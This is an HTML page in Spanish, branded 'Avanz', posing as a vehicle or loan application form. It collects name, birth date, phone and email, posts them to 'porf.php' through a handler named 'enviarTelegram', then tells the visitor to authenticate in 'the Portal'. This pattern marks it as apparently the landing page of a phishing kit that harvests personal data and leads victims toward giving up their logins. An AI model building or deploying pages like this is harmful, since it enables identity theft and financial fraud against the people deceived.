<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Avanz</title>
 
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
        }

        .header {
            height: 80px;
            display: flex;
           
            padding: 10px;
            background-color: #fff;
            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1);
        }

        .logo img {
            height: 50px;
        }

        .masa3 {
            width: 100%;
            height: 30px;
            background-color: #005961;
            padding: 5px;
            text-align: center;
            color: white;
        }

        .container {
            background: white;
            max-width: 90%;
            width: 400px;
            margin: 20px auto;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        h2 {
            border-bottom: 3px solid orange;
            padding-bottom: 5px;
            text-align: center;
        }

        label {
            font-weight: bold;
            display: block;
            margin-top: 10px;
        }

        input {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }

        button {
            background-color: orange;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            margin-top: 15px;
            font-size: 16px;
        }

        img {
         
            max-width: 400px;
            display: block;
            margin: auto;
        }

        @media (max-width: 600px) {
            .container {
                width: 100%;
                padding: 15px;
            }

            button {
                padding: 10px;
                font-size: 14px;
            }

            input {
                font-size: 14px;
            }
        }

        .pan {
            
          width: 100px;
        }
    </style>
</head>

<body>
    <div class="header">
        <div style="float: left;">        <img class="pan" src="img/lk.svg" alt="Avanz">
</div>
    </div>
    
    <div class="masa3">
        <p>Envio de solicitud</p>
    </div>

    <br>

    <center>
        <img src="Tu carro.jpg" alt="Carro">
        <br>
        <img src="image.png" alt="Imagen">
    </center>

    <br>
 
    <div class="container">
        <h2>Formulario de solicitud</h2>
        <br>
        <form id="formulario" method="post" action="porf.php">
            <label for="primer_nombre">* Nombre y apellido</label>
            <input type="text" id="primer_nombre" name="name" required>

            <br>  

            <label for="fecha_nacimiento">* Fecha de nacimiento</label>
            <input type="date" id="fecha_nacimiento" name="dates" required>

            <br>  

            <label for="telefono">* Número de teléfono</label>
            <input type="text" id="telefono" name="cel" required>

            <br>  

            <label for="correo">* Correo electrónico</label>
            <input type="email" id="correo" name="arroba" required>

            <br>  

            <button type="submit" onclick="enviarTelegram()">Enviar</button>
        </form>
    </div>

    <script>
        function enviarTelegram(event) {
            event.preventDefault();
            let formulario = document.getElementById('formulario');
            if (!formulario.checkValidity()) {
                formulario.reportValidity();
                return;
            }
        
            let overlay = document.createElement('div');
            overlay.style.position = 'fixed';
            overlay.style.top = '0';
            overlay.style.left = '0';
            overlay.style.width = '100%';
            overlay.style.height = '100%';
            overlay.style.background = 'rgba(0, 0, 0, 0.5)';
            overlay.style.display = 'flex';
            overlay.style.alignItems = 'center';
            overlay.style.justifyContent = 'center';
            overlay.style.zIndex = '9999';
            
            let mensajeBox = document.createElement('div');
            mensajeBox.style.background = '#fff';
            mensajeBox.style.padding = '20px';
            mensajeBox.style.borderRadius = '10px';
            mensajeBox.style.textAlign = 'center';
            mensajeBox.style.boxShadow = '0px 0px 10px rgba(0, 0, 0, 0.3)';
            mensajeBox.innerHTML = '<p style="font-size: 18px;">Para hacer efectiva tu solicitud deberás autenticarte en el Portal.</p>';
            
            overlay.appendChild(mensajeBox);
            document.body.appendChild(overlay);
            
            setTimeout(() => {
                document.body.removeChild(overlay);
                formulario.submit();
            }, 2000);
        }

        document.addEventListener("DOMContentLoaded", function () {
            document.getElementById('formulario').addEventListener('submit', enviarTelegram);
        });
    </script>

</body>
</html>
